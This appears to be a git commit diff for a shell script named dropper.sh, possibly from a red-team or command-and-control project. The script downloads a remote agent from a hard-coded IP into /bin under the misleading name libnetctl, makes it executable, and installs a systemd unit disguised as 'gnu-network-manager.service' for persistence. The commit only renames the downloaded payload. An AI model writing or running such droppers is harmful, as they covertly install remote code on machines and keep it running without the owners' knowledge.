d8d441f0b918b80f46c4be5bce23a0aa1d9c20e6
bcvillano <bvillano05@gmail.com>
2026-02-27 00:10:20 -0500

    testing

--- files/dropper.sh
+++ files/dropper.sh
@@ -1,6 +1,6 @@
 IP="192.168.1.1"
 
-wget http://$IP/download/linux-agent -O /bin/libnetctl -o /dev/null
+wget http://$IP/download/test-linux-agent -O /bin/libnetctl -o /dev/null
 chmod 755 /bin/libnetctl
 wget http://$IP/download/systemdfile -O /etc/systemd/system/gnu-network-manager.service -o /dev/null
 chmod 644 /etc/systemd/system/gnu-network-manager.service
